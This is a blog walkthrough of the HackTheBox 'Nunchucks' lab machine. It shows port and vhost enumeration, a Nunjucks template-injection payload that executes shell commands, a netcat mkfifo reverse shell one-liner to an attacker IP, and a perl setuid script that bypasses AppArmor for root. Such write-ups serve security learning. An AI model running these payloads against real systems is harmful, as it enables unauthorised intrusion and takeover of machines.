---
title: HackTheBox Nunchucks
date: 2021-11-09
categories: [CTF, hackthebox]
tags: [htb, hackthebox, ctf, nmap, https, '443', ssti, cap_setuid, setuid, capability, linux, javascript, perl, apparmor, nunjucks, express, expressjs, template, injection, gtfobins, gtfo, shebang, launchpad]     # TAG names should always be lowercase

image:
  src: /image/hackthebox/nunchucks/machineinfocard.png
  width: 1000   # in pixels
  height: 400   # in pixels
  alt: monitorsinfocard
---

Nunchucks is an Easy level box that is using ExpreessJS application template engine, Nunjucks, and later finding out its subdomain. On that subdomain Server Side Template Injection(SSTI) vulnerability is residing. Exploiting the vulnerability with POC and getting shell as user David. David has `setuid` capability on perl binary, later finding out that this binary has limited permissions from AppArmor and after understanding it we can exploit AppArmor using shebang to get root user.  



# Enumeration

## Nmap

`nmap` is a is a network scanner. With feeding this an IP you can scan for its open ports and services running on it. This tool is exalted for its positive results in the InfoSec community.

Starting nmap with full port scanning without detecting services and storing the results into **all** file prepending with flag -oA. 

* `-p-` : Specifies All ports 0-65535 
* `-oA` : To print output into files with extensions gnmap,xml,nmap, Here A stands for All. 
* `--min-rate=` : When the --min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate. And I got the following result,

``` bash
Nmap scan report for 10.10.11.122
Host is up (0.35s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 383.21 seconds
```

Now I scan them to identify running services and nmap pre-installed scripts using `-sV` and `-sC` flags respectively.

``` bash
Nmap scan report for 10.10.11.122
Host is up (0.35s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 (RSA)
|   256 a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 (ECDSA)
|_  256 e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
|_http-title: Nunchucks - Landing Page
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.29 seconds
```

On port 443, hostname is given by nmap output, I will quickly add it to my host file.

> 10.10.11.122    nunchucks.htb nunchucks

# Escalating to David user

Visiting `10.10.11.122` or `nunchucks.htb:80` redirects to `https`.

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/01.png" alt="01" style="zoom:67%;" />

There is a team listed at the bottom of the page, I made small list from them.

> mike page
> samnatha bloom
> nicolas ritcher
> mary longhorn
> susanne blake
> vanya dropper

There are `login` and `signup` pages also but both of them are throwing errors..

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/02.png" alt="02" style="zoom: 67%;" />

## Discovering store.nunchucks.htb

In the background, I was running `ffuf` to find any Vhosts and it found `store.nunchucks.htb`.

``` bash
ffuf -u https://nunchucks.htb/ -w /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt -H "Host: FUZZ.nunchucks.htb" -fl 547
```

* `-u` : Provide URL to scan
* `-w` : Wordlist
* `-H` : Header, Here Header `Host` is used to scan for Vhosts.
* `-fl` : To filter lines in repsonse. 

![03](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/03.png)

Adding it to `/etc/hosts`

> 10.10.11.122    nunchucks.htb nunchucks store.nunchucks.htb

At the bottom of `https://nunchucks.htb` page was `Store: Coming soon` was written. It was hint for Vhost as well.

![](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/04.png)



## Discovering SSTI on store.nunchucks.htb

Now visting `store.nunchucks.htb`,

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/05.png" alt="05" style="zoom:67%;" />



I entered my email address in textbox and captured the request,

![](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/06.png)

After looking at the request and response, both are in JSON format and my input was reflected on response.

 Also noted that server is ExpressJS. Express.js, or simply Express, is a back end web application framework for Node.js.

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/07.png" style="zoom:80%;" />



I tried XSS, SQL non of them gave me fruitful results. After keep looking for any perculiar behaviour I found that my input was rendered by back end engine.

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/08.png" alt="08" style="zoom:80%;" />

 Googling for ExpressJS template engines lead me to [a list of template engines](https://expressjs.com/en/resources/template-engines.html) used.  Name of the box and this template engine sounds similar hence clearly shows that this is inteded vulnerability.

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/09.png" alt="09" style="zoom:80%;" />

I googled for `Nunjucks template injection` and it lead me to [a blog site that showed POC](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine) on how to exploit data.

> ```javascript
> {{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
> ```

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/10.png" alt="10" style="zoom:80%;" />



I changed `tail` to `cat` and I got more data than previous response, I was able to extract whole `/etc/passwd` file. After looking at the `/etc/passwd`, user is David. So I tried extracting ssh key residing in home directory of david, but it is asking for password.



![11](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/11.png)

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/12.png" alt="12" style="zoom:80%;" />

Now I used nc reverse shell from [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and I got shell as user.

> ```bash
> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.25 9001 >/tmp/f
> ```

While getting proper shell, this box is really sensitive I lost my reverse shell trying to put SSH key inside `authorized_keys`. Anyway I did that from burp suite.

![13](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/13.png)

I got proper SSH shell.

<img src="/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/14.png" alt="14" style="zoom: 67%;" />

# Getting root

User David has one interesting capability, he can run perl commands with setuid capability.

![15](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/15.png)

I head over to GTFObins and copied their [capability payload](https://gtfobins.github.io/gtfobins/perl/#capabilities) but I did not get shell as root.

![16](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/16.png)

After looking for more information, I came across some interesting files in `/opt` directory.

``` bash
david@nunchucks:/opt$ ls -la
total 16
drwxr-xr-x  3 root root 4096 Oct 28 17:03 .
drwxr-xr-x 19 root root 4096 Oct 28 17:03 ..
-rwxr-xr-x  1 root root  838 Sep  1 12:53 backup.pl
drwxr-xr-x  2 root root 4096 Nov  8 11:41 web_backups
```

looking at the `backup.pl` file,

``` bash
#!/usr/bin/perl
use strict;
use POSIX qw(strftime);
use DBI;
use POSIX qw(setuid); 
POSIX::setuid(0); 

my $tmpdir        = "/tmp";
my $backup_main = '/var/www';
my $now = strftime("%Y-%m-%d-%s", localtime);
my $tmpbdir = "$tmpdir/backup_$now";

sub printlog
{
    print "[", strftime("%D %T", localtime), "] $_[0]\n";
}

sub archive
{
    printlog "Archiving...";
    system("/usr/bin/tar -zcf $tmpbdir/backup_$now.tar $backup_main/* 2>/dev/null");
    printlog "Backup complete in $tmpbdir/backup_$now.tar";
}

if ($> != 0) {
    die "You must run this script as root.\n";
}

printlog "Backup starts.";
mkdir($tmpbdir);
&archive;
printlog "Moving $tmpbdir/backup_$now to /opt/web_backups";
system("/usr/bin/mv $tmpbdir/backup_$now.tar /opt/web_backups/");
printlog "Removing temporary directory";
rmdir($tmpbdir);
printlog "Completed";
```

This file on execution zipping files from web directory to `/opt/web_backups` also it is using POSIX to setuid(0) i.e. setting it to root. 

It is using AppArmor for execution. AppArmor limits resources for programs and its profiles allows user capability. Looking at the profile in `/etc/apparmor.d`,

``` bash
david@nunchucks:/etc/apparmor.d$ ls -la
-- snip --
-rw-r--r--   1 root root   442 Sep 26 01:16 usr.bin.perl
-- snip --
```

Reading file showed that perl is denied  `rwx` access on /root, while it can run later commands such as `id` , `ls`, `cat`, `whoami` and file in `/opt/backup.pl` directory.

``` bash
# Last Modified: Tue Aug 31 18:25:30 2021
#include <tunables/global>

/usr/bin/perl {
  #include <abstractions/base>
  #include <abstractions/nameservice>
  #include <abstractions/perl>

  capability setuid,

  deny owner /etc/nsswitch.conf r,
  deny /root/* rwx,
  deny /etc/shadow rwx,

  /usr/bin/id mrix,
  /usr/bin/ls mrix,
  /usr/bin/cat mrix,
  /usr/bin/whoami mrix,
  /opt/backup.pl mrix,
  owner /home/ r,
  owner /home/david/ r,

}
```

 Let's try those commands,

![17](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/17.png)

[Bug from launchpad](https://bugs.launchpad.net/apparmor/+bug/1911431) shows that adding [Shebang(#)](https://en.wikipedia.org/wiki/Shebang_(Unix)#:~:text=In%20computing%2C%20a%20shebang%20is,bang%2C%20or%20hash%2Dpling.) will bypass security checks and execute arbitrary script.

I created small script mentioned before from GTFObins, and added shebang 

>  #!/usr/bin/perl
> use POSIX qw(setuid);
> POSIX::setuid(0); 
> exec "/bin/sh";

gave the script `+x` permission

> chmod +x shell.pl

and *voilà* I got root.

![18](/media/janak/workshop/website/chirpy/am-root.github.io/image/hackthebox/nunchucks/18.png)
